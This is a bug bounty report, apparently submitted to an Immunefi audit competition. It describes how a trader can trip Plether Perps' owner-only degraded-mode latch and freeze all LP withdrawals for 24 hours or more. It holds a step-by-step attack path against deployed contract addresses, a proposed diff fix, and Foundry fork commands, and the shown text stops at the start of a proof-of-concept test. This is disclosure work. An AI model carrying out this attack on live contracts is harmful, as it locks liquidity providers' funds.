# \#98453 [SC-High] Owner-only `CfdEngine.clearDegradedMode()` lets an unprivileged trader freeze all LP exits for ≥ 24 h on a solvent pool

**Submitted on Nov 8th 2026 at 06:20:07 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98453
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

# Brief/Intro

This finding was identified and documented collaboratively by georgibuilds and EagleEye.

`degradedMode` is a one-way solvency latch: `CfdEngine._enterDegradedModeIfInsolvent()` sets it when a close or liquidation leaves effective pool assets below the larger side's maximum liability (`E < L`), and the **only** way to unset it is `CfdEngine.clearDegradedMode()`, which is `onlyOwner`. While set, `HousePool._requireWithdrawalsLive()` reverts every LP epoch settlement with `HousePool__DegradedMode`, so no redemption is funded and no deposit activated. An unprivileged trader running two of their own accounts opens a self-hedged LONG/SHORT pair at marginal solvency, partially closes the winning leg to trip `E < L`, then closes everything so the pool is fully solvent again (`E ≫ L`, no open positions) - yet the latch stays set, since it neither auto-clears nor admits a permissionless clear. On a fork of the Arbitrum Sepolia v2.0.0 deployment the attacker spends a net **3,204.43 USDG** and freezes **399,999.99 USDG** of matured LP requests (124:1) for over 24 hours, until the owner intervenes. Impact: High, "Temporary freezing of funds for at least 24 hours".

## Vulnerability Details

**Root cause**

1. The latch is one-way. `_enterDegradedModeIfInsolvent()` returns early if the flag is already set, else sets it when `E < L` ([CfdEngine.sol#L1351-L1369](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369)), where `E = _availableCashForFreshPoolPayouts() = totalAssets − totalTraderClaimBalanceAssets` ([#L865-L871](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L865-L871)) and `L = _maxLiability()` is the larger side's aggregate max-profit liability ([#L1044-L1050](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1044-L1050)). The early return means a later close that restores `E ≥ L` never re-evaluates the flag.
2. The only writer that sets it back to `false` is `clearDegradedMode()`, which is `onlyOwner` ([CfdEngine.sol#L658-L667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)). It already enforces solvency (`CfdEngine__StillInsolvent` when `E < L`), so the `onlyOwner` restriction is the sole reason an otherwise-valid clear cannot happen permissionlessly (`grep "degradedMode = false"` finds this one site).
3. The latch is set from inside ordinary trader actions: `_applyClose()` ([CfdEngine.sol#L1306-L1322](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1306-L1322)) and `_applyLiquidation()` ([#L1324-L1348](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1324-L1348)) both invoke `_enterDegradedModeIfInsolvent()` after the sidecar moves the closer's PnL ([#L1320](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1320), [#L1344](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1344)), both reachable by any trader through the permissionless `OrderRouter`.
4. The latch freezes every LP exit. `HousePool._settleLpEpoch()` calls `_requireWithdrawalsLive()` first ([HousePool.sol#L824-L833](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L833)), which reverts `HousePool__DegradedMode` ([#L1864-L1870](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1870)). This blocks **both** settle routes: the keeper route via `OrderLiquidationBatchLogic.settleLpEpoch()` ([#L549](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549)) and the permissionless direct `HousePool.settleLpEpoch()` ([#L797-L820](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L820)), which needs no Router when there are no open positions. Settlement is the only path that funds matured redemptions and activates matured deposits, so every Junior and Senior LP exit is frozen.
5. Victims cannot self-rescue. A matured redeem request cannot be cancelled (`currentLpEpoch() >= requestId` → `TrancheVault__RedeemCancellationUnavailable`, [TrancheVault.sol#L877-L897](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L877-L897)); an active deposit epoch cannot be cancelled either (`TrancheVault__DepositEpochAlreadyActive`, [#L826-L860](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L826-L860)), and refunds only by epoch rejection inside settlement — itself frozen.
6. The same flag gates other entry points while set: new opens revert in `CfdEnginePlanLib.planOpen()` and `OrderLiquidationBatchLogic._validateOpenCommitAllowed()`, `CfdEngineOpenQuoter._quote()` returns no size, live-position margin withdrawal reverts in `CfdEngineSettlementSidecar.validateWithdraw()`, and the max-withdraw views (`HousePoolFreshnessLib.withdrawalsLive()`) read zero. These widen the DoS beyond the selected LP-freeze impact.

**Why this is a bug, not the documented containment**

The docs describe degraded mode as a containment latch for a terminal transition that "does not auto-clear merely because a later mark looks solvent" (WHITEPAPER), cleared by the owner "once `E ≥ L`" (ACCOUNTING_SPEC). The finding does not dispute that LP settlement is blocked while degraded, nor that the clear is manual. What makes it a bug is the combination the docs do not sanction:

- The trigger is **unprivileged, cheap and reversible**. `E < L` is reached not by a terminal loss but by the *ordering* of two self-hedged closes: a partial close of the winning leg momentarily drops `E` below the still-large `L` of the unclosed losing leg; closing that leg restores `E ≫ L`. The pool never loses capital — the "insolvency" is an on-demand artifact.
- After the unwind the pool is **fully solvent with no open positions** (`L = 0`). Nothing is left to contain, yet the one-way owner-only latch - with no assumed response deadline ("No detection or response deadline is assumed unless explicitly documented for the competition") - freezes every LP exit until a human acts.

An attacker thus turns a terminal-insolvency safety mechanism into an on-demand, ≥ 24 h denial of service against all LP withdrawals, at negligible cost and no residual risk. We do not claim a broken documented invariant — the docs make degraded mode the explicit exception to normal-mode LP funding. The in-scope harm is the impact itself: "Temporary freezing of funds", a listed impact that no program rule excludes, caused by an unprivileged caller against a solvent pool. The documentation describing the latch is sponsor documentation, not an entry on the contest's known-issues list, and nothing there names this freeze.

**Pre-conditions**

1. Live (unfrozen) basket market — the PoC pins a weekday block and asserts `isOracleFrozen() == false`. No frozen window, no weekend, no FIFO-queue dependency.
2. The pool sits near marginal solvency while the attacker's hedge is open. The attacker creates this by opening an equal LONG/SHORT pair up to the solvency admission limit (`E ≥ L + B`); no honest LP action is required. Capital used is ~4 % of the pool depth per account and is fully recovered except fees/carry. Two accounts are used only because each account holds a single direction (SECURITY.md) — not a Sybil-for-influence pattern; a single directional position can also tip `E < L` on its profitable close, but leaves the attacker with price exposure, whereas the hedge stays market-neutral.
3. A basket move of roughly ≥ 0.71 % (release `vpiFactor`/buffer) while the hedge is open, so a partial winning-leg close tips `E < L`. The PoC uses a 0.8 % move (ordinary FX, no manipulation).
4. The owner does not call `clearDegradedMode()` for 24 h. The program assumes no response deadline unless one is documented, and none is (checked across SECURITY.md / EMERGENCY_RESPONSE_GUIDE.md). Without the owner-inaction premise the impact is still "Temporary freezing of funds for at least 1 hour" (Medium); with it, the ≥ 24 h High tier.

PoC environment (all out of scope, per the PoC rules): the PoC forks the deployed v2.0.0 contracts and drives them through the real `OrderRouter`, so it builds its own actors rather than reusing the repo's local `BasePerpTest` (which deploys fresh mocks, not the deployment under test). Pyth's code is replaced by the repo's `MockPyth`, seeded from the real stored prices/fee; basket moves are Pyth updates. USDG reaches actors via `deal`; `ArbSys.arbBlockNumber()` (precompile `0x64`, out of scope) follows `vm.roll`. The owner is pranked only for the Step-8 positive control, never in the attack path. No in-scope contract is modified, etched or mocked.

**Not a known issue**

- Cecuro LOW-22 (Addressed) records only that `recapitalizePool()` "does not automatically clear degraded mode" — owner recapitalization semantics, with no unprivileged trigger and no LP freeze on a recovered pool. Different root cause.
- The contest known-issues list (MED-7/13/16/22/24/29/30, LOW-57, HIGH-1) and SECURITY.md "Known Limitations" do not name the degraded-mode latch or this freeze.

**Design-intent evidence weighed (not a known issue, but a judge will read it).** Repo tests assert pieces of degraded mode as intended — `DegradedModeLifecycle.t.sol::test_DegradedMode_BlocksJuniorWithdrawals`, `::test_DegradedMode_ClearRequiresRecapitalization`, `DegradedSettlementBehavior.t.sol::test_OwnerCanClearDegradedModeAfterRecapitalization` ("Funding must not automatically clear degraded mode") — each fixing it as a terminal-insolvency containment with an owner exit. None exercises the scenario here: a deliberate, unprivileged, reversible trip leaving the pool fully solvent with no open positions, then an owner-only ≥ 24 h freeze. The tested behaviour is the containment; the finding is its weaponization. No repo test asserts that a non-owner is rejected when clearing the latch. They assert three things. Clearing reverts with `CfdEngine__StillInsolvent` while E < L (`DegradedModeLifecycle.t.sol:89`, `DegradedSettlementBehavior.t.sol:113`). Funding alone leaves the mode set ("Funding must not automatically clear degraded mode", DegradedSettlementBehavior.t.sol line 119). Clearing succeeds once solvency is restored ("Owner should clear degraded mode after recapitalization", DegradedModeLifecycle.t.sol line 101 and DegradedSettlementBehavior.t.sol line 124). The recommended fix keeps all three and removes only the owner dependency.

## Impact Details

**Selected impact:** Temporary freezing of funds for at least 24 hours

Severity: **High**, stated transparently. The code-guaranteed floor is Medium, "Temporary freezing of funds for at least 1 hour" (the freeze lasts at least one LP epoch). It reaches High, "Temporary freezing of funds for at least 24 hours", because the clear is manual and the program assumes no response deadline ("No detection or response deadline is assumed unless explicitly documented for the competition"); owner responsiveness is a feasibility factor, and "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it." So High is the impact-first severity and a fast owner response reduces only the payout.

Griefing is not a valid downgrade under the numeric baseline: attacker net cost 3,204.43 USDG vs 399,999.99 USDG frozen is 124:1, above the 100:1 line at which damage "is not" Griefing. This is case-by-case: the frozen principal is recoverable once the owner acts, so a judge weighing the ~24 h deprivation rather than the principal could land lower.

From the PoC (release parameters asserted; USDG, 6 decimals; full run at the pinned fork block in the command below):

| Quantity | Value |
|---|---|
| Pool depth when hedged (`E`) | 1,300,068.13 USDG |
| Hedge per leg (`L` at the latch) | 1,296,826.06 USDG |
| Attacker funding (two accounts, 4 % each) | 104,000.16 USDG |
| Latch tripped at | `E` 1,296,825.85 < `L` 1,296,826.06 |
| After full unwind | `E` 1,301,836.03, `L` 0, free cash 1,301,836.03, **no open positions** |
| Attacker net spend (fees + carry, not recovered) | **3,204.43 USDG** |
| Alice matured Junior redemption, frozen | 299,999.99 USDG (`maxRedeem` 0, request unfunded ≥ 24 h) |
| Bob matured Junior deposit, frozen | 100,000.00 USDG (never activated, uncancellable ≥ 24 h) |
| Total LP funds frozen ≥ 24 h | **399,999.99 USDG** |
| Damage / attacker net spend | **124 : 1** |
| Positive control: owner clears, same keeper settle pays Alice | 300,423.24 USDG |

The freeze applies to **all** LPs, not only the two modelled: Senior redemptions pass the same `_requireWithdrawalsLive()` gate, and new deposit requests are blocked by `_entryStatusBlocked()` ([HousePool.sol#L1139-L1144](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1144)) while degraded. The 399,999.99 USDG is the modelled slice; the true figure is the whole pool's matured and pending LP flow.

## Recommendation

Make the clear permissionless: the latch is a solvency gate, so anyone should be able to lift it once solvency is restored, while the existing `CfdEngine__StillInsolvent` guard keeps it unliftable during a real shortfall. This removes the owner-inaction window without weakening containment during genuine insolvency.
```diff
diff --git a/packages/perps/src/CfdEngine.sol b/packages/perps/src/CfdEngine.sol
index 8e764882..84d71758 100644
--- a/packages/perps/src/CfdEngine.sol
+++ b/packages/perps/src/CfdEngine.sol
@@ -653,9 +653,11 @@ contract CfdEngine is ICfdEngineTypes, IWithdrawGuard, ICfdEngineAdminHost, CfdT
     }
 
     /// @notice Clears degraded mode once adjusted solvency has recovered.
-    /// @dev Callable only by the owner. Recovery requires HousePool physical assets net of senior trader claims to
-    ///      cover the larger side's aggregate maximum-profit liability.
-    function clearDegradedMode() external onlyOwner {
+    /// @dev Permissionless: the latch is a solvency gate, so anyone may lift it, but only when HousePool physical
+    ///      assets net of senior trader claims cover the larger side's aggregate maximum-profit liability. The
+    ///      CfdEngine__StillInsolvent guard keeps it unliftable while a genuine shortfall remains, so this cannot
+    ///      re-open settlement during real insolvency.
+    function clearDegradedMode() external {
         if (!degradedMode) {
             revert CfdEngine__NotDegraded();
         }
```

Alternatively, re-evaluate the flag inside `_enterDegradedModeIfInsolvent()` so a close/liquidation that restores `E ≥ L` clears it automatically (a larger change: the docs currently specify no auto-clear). Either way the fix must keep the solvency guard, so settlement can never re-open while the pool is truly insolvent.

## References

- Contest commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8

## Proof of Concept

## Proof of Concept

### Attack path

1. Alice holds a matured Junior redeem request and Bob a matured Junior deposit request; both mature at the start of the LP epoch after the attack, so no keeper could have settled them earlier. (`// Step 1`)
2. The attacker funds two own accounts (4 % of pool depth each) and opens an equal LONG/SHORT hedge up to the solvency admission limit (`E ≈ L + B`). (`// Step 2`)
3. The basket moves −0.8 % (USD strengthens); the LONG leg is in profit. (`// Step 3`)
4. The attacker closes the smallest winning-leg fraction that tips `E < L`; `degradedMode` latches. (`// Step 4`)
5. The attacker closes the losing SHORT leg in full. Solvency is restored (`E ≥ L + B`, free cash exceeds Alice's redemption), yet the latch persists. (`// Step 5`)
6. The attacker closes the winning remainder and is flat (`L = 0`, pool fully solvent); the latch persists. Net spend ≈ 3,204 USDG. (`// Step 6`)
7. The requests mature. Both settle routes revert `HousePool__DegradedMode` and neither victim can cancel. For 24 h, hourly, a keeper refreshes the mark and tries both settle routes and `clearDegradedMode()` - all rejected. After ≥ 24 h Alice's redemption is unfunded (`maxRedeem` 0) and Bob's deposit never activated. (`// Step 7`)
8. Positive control: only the owner lifts the latch; immediately after, the same keeper settle funds Alice (she redeems 300,423.24 USDG) and activates Bob — isolating the owner-only latch as the sole cause. (`// Step 8`)

Control (`test_F033_control`): the identical LP flow with no attack; at maturity a keeper settles, Alice is paid (299,999.99 USDG) and Bob's deposit activates. Must pass with and without the mitigation.

Add the test at the path shown in the command, then run:
```bash
# Repository at commit a82d4fef; `git submodule update --init --recursive` first.
# Run from packages/perps/ (its foundry.toml); add the test at test/F033_OwnerOnlyLatchInCfdEngine.t.sol.
# Tested with forge Version: 1.8.7.
# Local fork of Arbitrum Sepolia (chain id 421614) at block 323672710, Plether Perps v2.0.0 (USDG).
# Read-only RPC; nothing is sent to the public network. The RPC must be an ARCHIVE node: public endpoints prune the state of older blocks.
### RUN This comands
ARB_SEPOLIA_RPC_URL=<arbitrum-sepolia-archive-rpc-url> forge test --match-path test/F033_OwnerOnlyLatchInCfdEngine.t.sol --match-test test_F033_poc -vvv
### RUN This comands
# Same test against a local Anvil fork:
anvil --fork-url <arbitrum-sepolia-archive-rpc-url> --fork-block-number 323672710 --chain-id 421614 &
ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F033_OwnerOnlyLatchInCfdEngine.t.sol --match-test test_F033_poc -vvv
```
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Owner-only latch in `CfdEngine.clearDegradedMode()` with no automatic clear in `CfdEngine._enterDegradedModeIfInsolvent()` lets an unprivileged trader freeze matured LP redemptions and Junior deposits through `HousePool._requireWithdrawalsLive()` after raw solvency is restored
// Chain: Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F033_OwnerOnlyLatchInCfdEngine.t.sol --match-test test_F033_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number 323672710 &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F033_OwnerOnlyLatchInCfdEngine.t.sol ...
// The RPC must serve historical state at block 323672710 (an ARCHIVE node). The public https://sepolia-rollup.arbitrum.io/rpc
// does not; https://arbitrum-sepolia.gateway.tenderly.co does.
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";
// Import interfaces and types only (not the in-scope implementations): editing this file then recompiles in seconds,
// and the PoC cannot accidentally deploy local code instead of the deployment.
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public getters and calls of the deployed HousePool that the PoC uses (not all are on IHousePool).
interface IHousePoolF033 {
    function totalAssets() external view returns (uint256);
    function unassignedAssets() external view returns (uint256);
    function getSettlementFreeAssets() external view returns (uint256);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function owner() external view returns (address);
    function seniorVault() external view returns (address);
    function juniorVault() external view returns (address);
    function lpEpochSettlementPaused() external view returns (bool);
    function paused() external view returns (bool);
}

interface IEngineF033 {
    function owner() external view returns (address);
    function degradedMode() external view returns (bool);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function lastMarkPrice() external view returns (uint256);
    function CAP_PRICE() external view returns (uint256);
    function executionFeeBps() external view returns (uint256);
    function settlementBufferBps() external view returns (uint256);
    function frozenCloseSpreadBps() external view returns (uint256);
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            CfdTypes.Side side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );
    function riskParams()
        external
        view
        returns (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        );
    function clearDegradedMode() external;
}

interface IRouterF033 {
    function pletherOracle() external view returns (address);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
}

interface ITrancheVaultF033 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function redeem(uint256 shares, address receiver, address controller) external returns (uint256 assets);
    function cancelPendingDeposit(uint256 requestId, address receiver, address controller) external returns (uint256);
    function cancelRedeemRequest(uint256 requestId, address receiver, address controller)
        external
        returns (uint256);
    function maxRedeem(address controller) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function claimableDepositShares(uint256 requestId, address controller) external view returns (uint256);
    function pendingDepositRequest(uint256 requestId, address controller) external view returns (uint256);
    function pendingRedeemRequest(uint256 requestId, address controller) external view returns (uint256);
    function currentLpEpoch() external view returns (uint256);
}

interface IOracleF033 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
}

interface IPythFeeF033 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF033 {
    function arbBlockNumber() external view returns (uint256);
}

/// @dev Custom-error selectors the PoC asserts on. Declared locally (signature-identical to the in-scope contracts:
///      IHousePool.sol:136, TrancheVault.sol:163, :174, OpenZeppelin Ownable) so the test needs no extra imports.
interface IF033Errors {
    error HousePool__DegradedMode();
    error TrancheVault__RedeemCancellationUnavailable();
    error TrancheVault__DepositEpochAlreadyActive();
    error OwnableUnauthorizedAccount(address account);
}

/// @dev The permissionless direct HousePool settle route (HousePool.sol:797). Every call to it below is expected to
///      revert, so the return value is never decoded.
interface IPoolDirectSettleF033 {
    function settleLpEpoch(uint256 expectedMarkPrice, uint256 expectedPublishTime) external returns (uint256);
}

contract F033_OwnerOnlyLatchInCfdEngine is Test {
    // Pinned Arbitrum Sepolia block (2026-10-28 ~12:10 UTC, a Wednesday: FX market open), 24 blocks after the first
    // Junior LP epoch settled (pool = 1,000,002 USDG). At or after the deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 323672710;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B; // PERPS_OWNER (engine + pool owner)
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    uint256 internal constant BASE = 10_000;

    IHousePoolF033 internal pool = IHousePoolF033(POOL);
    IEngineF033 internal engine = IEngineF033(ENGINE);
    IRouterF033 internal routerViews = IRouterF033(ROUTER);
    IPerpsKeeper internal keeperRouter = IPerpsKeeper(ROUTER);
    ITrancheVaultF033 internal junior = ITrancheVaultF033(JUNIOR_VAULT);
    IMarginClearinghouse internal clearinghouse = IMarginClearinghouse(CLEARINGHOUSE);
    IOrderLifecycleBook internal lifecycle = IOrderLifecycleBook(LIFECYCLE_BOOK);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal alice = makeAddr("alice"); // Junior LP whose redeem request matures during the latch
    address internal bob = makeAddr("bob"); // Junior LP whose deposit request matures during the latch
    address internal atkLong = makeAddr("attackerLong"); // attacker account 1 (LONG leg)
    address internal atkShort = makeAddr("attackerShort"); // attacker account 2 (SHORT leg)
    address internal keeper = makeAddr("keeper"); // any LP-epoch settler / order executor
    address internal refresher = makeAddr("refresher"); // any mark refresher

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;
    uint64 internal cur; // scenario clock (== block.timestamp)
    uint256 internal orderNonce;

    // Scenario sizes (USDG, 6 decimals). Pool at the fork is 1,000,002 USDG.
    uint256 internal constant ALICE_DEPOSIT = 300_000e6; // Junior LP; her whole position is the matured redemption
    uint256 internal constant BOB_DEPOSIT = 100_000e6; // Junior LP; deposit request that matures during the latch
    uint256 internal constant BPS_DOWN = 9_920; // basket -0.8% (USD strengthens): the LONG leg wins
    uint256 internal constant FUNDING_PCT = 4; // attacker funds each account with 4% of pool depth

    struct Lp {
        uint256 aliceShares;
        uint256 aliceRequestId;
        uint256 aliceAssets; // assets the redeem request is worth at the pool price
        uint256 bobRequestId;
    }

    struct Hedge {
        uint256 sizePerLeg; // units (1e18), same on both legs
        uint256 p0; // mark (1e8) when the hedge was built
        uint256 funded; // USDG the attacker deposited into its two accounts
        uint256 E;
        uint256 L;
    }

    // virtual: the never-submitted fix-check test (`finding.py poc <F-NNN> --fix-test`) extends this setUp.
    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(routerViews.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF033(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF033(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertEq(pool.seniorVault(), SENIOR_VAULT, "senior vault drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertEq(pool.owner(), OWNER, "pool owner drifted");
        assertEq(engine.owner(), OWNER, "engine owner drifted");
        assertFalse(IOracleF033(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertEq(pool.totalAssets(), 1_000_002e6, "pool = 1,000,002 USDG (Junior seed epoch settled)");
        assertEq(pool.unassignedAssets(), 0, "no unassigned assets at the fork");
        assertFalse(pool.lpEpochSettlementPaused(), "no settlement hold at the fork");
        assertFalse(pool.paused(), "pool not paused at the fork");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF033(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF033(ORACLE).inversions(i));
        }
        _assertReleaseParameters();
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope (scope page: "Mocks may only replace components outside the scope, such as Pyth price
        // updates and USDG"): replace its code with the repo's MockPyth. Storage starts from the REAL stored prices at
        // FORK_BLOCK. The real deployment quotes a zero update fee; keep it.
        pythFee = IPythFeeF033(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
            assertLe(p.publishTime, block.timestamp, "real stored Pyth time must not be in the future");
        }
        cur = uint64(block.timestamp);
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);
    }

    /// @dev DEPLOYMENT.md "Initial release parameters" (scope page: severity is assessed with these) against the
    ///      forked engine. They match, so no owner timelock step is needed.
    function _assertReleaseParameters() internal view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        ) = engine.riskParams();
        assertEq(engine.CAP_PRICE(), 2e8, "CAP_PRICE");
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(maintMarginBps, 10, "maintMarginBps");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(fadMarginBps, 300, "fadMarginBps");
        assertEq(baseCarryBps, 500, "baseCarryBps");
        assertEq(minBountyAssets, 1e6, "minBountyAssets");
        assertEq(bountyBps, 10, "bountyBps");
        assertEq(keeperShareBps, 5_000, "keeperShareBps");
        assertEq(protocolShareBps, 0, "protocolShareBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "frozenCloseSpreadBps");
    }

    // ================================================================= F-033 proof of concept
    //
    // An unprivileged trader latches `degradedMode` with a partial profitable close, then unwinds so raw solvency is
    // fully restored (E >= L + B, and finally no open positions at all). The owner-only latch persists, so BOTH
    // `settleLpEpoch` routes keep reverting `HousePool__DegradedMode` for >= 24 h after the LP requests mature: Alice's
    // matured Junior redemption and Bob's matured Junior deposit stay frozen, with no cancel and no permissionless
    // clear. Step 8 shows the owner is the ONLY actor that can lift it, and that the frozen funds were payable.
    function test_F033_poc() public {
        // Step 1: Alice holds a Junior redeem request and Bob a Junior deposit request; both mature at the start of
        //         the next LP epoch (id e0+3), i.e. after the attack below, so no keeper could have settled them yet.
        uint256 e0 = _epoch0();
        Lp memory lp = _lpSetup(e0);
